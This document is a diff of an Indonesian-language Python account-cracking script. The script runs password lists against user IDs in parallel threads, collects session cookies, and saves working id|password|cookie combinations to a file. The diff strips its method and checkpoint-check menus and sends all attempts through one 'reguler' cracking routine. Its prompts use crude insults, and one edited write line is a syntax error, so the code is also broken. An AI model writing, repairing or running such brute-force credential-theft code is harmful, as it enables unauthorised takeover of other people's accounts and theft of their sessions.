@@ -1347,34 +1347,6 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
-    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white] Metode Async[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white] Metode Biasa[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white] Metode Reguler [bold green](recomend)[bold white] [/]', title="[bold green] Method",width=80,style=f"{color_panel}"))
-    hc = console.input(f" {H2}• {P2}Masukan : ")
-    if hc in ['1','01']:
-        method.append('_async')
-    elif hc in ['2','02']:
-        method.append('metode_api')
-    elif hc in ['3','03']:
-        method.append('reguler')
-    else:
-        method.append('_async')
-    Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',title=f"[bold green]Setting Cek Apk",width=80,style=f"{color_panel}"))
-    joki = console.input(f" {H2}• {P2}Masukan : ")
-    if joki in ['']:
-        print(' [+] Pilih Yang Bener Kontol ')
-        exit()
-    elif joki in ['y','Y']:
-        taplikasi.append('ya')
-    else:
-        taplikasi.append('no')
-    Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
-    joki = console.input(f" {H2}• {P2}Masukan : ")
-    if joki in ['']:
-        print(' [+] Pilih Yang Bener Kontol ')
-        exit()
-    elif joki in ['y','Y']:
-        gabriel.append('ya')
-    else:
-        gabriel.append('no')
     Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Mengunakan UA Manual Untuk Melakukan Crack Account ? Y/T',title=f"[bold green]Setting User-Agent",width=80,style=f"{color_panel}"))
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ['y','Ya','ya','Y']:
@@ -1429,14 +1401,11 @@ def passwrd():
 					for xpwd in pwnya:
 						pwv.append(xpwd)
 				else:pass
-				if '_async' in method:
-					pool.submit(crack1,idf,pwv,awal)
-				elif 'metode_api' in method:
-					pool.submit(memex,idf,pwv,awal)
-				elif 'reguler' in method:
+				if '' in method:
+					
 					pool.submit(reguler,idf,pwv,awal)
 				else:
-					pool.submit(_async,idf,pwv)
+					pool.submit(reguler,idf,pwv,awal)
 		print('')
 	Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
 	Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1507,8 +1476,9 @@ def reguler(idf,pwv,awal):
 				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
 				prints(tree)
 				os.popen('play-audio o.mp3')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki'\n')
 				cek_apk(kuki)
+				akun.append(idf+'|'+pw+'|'+kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
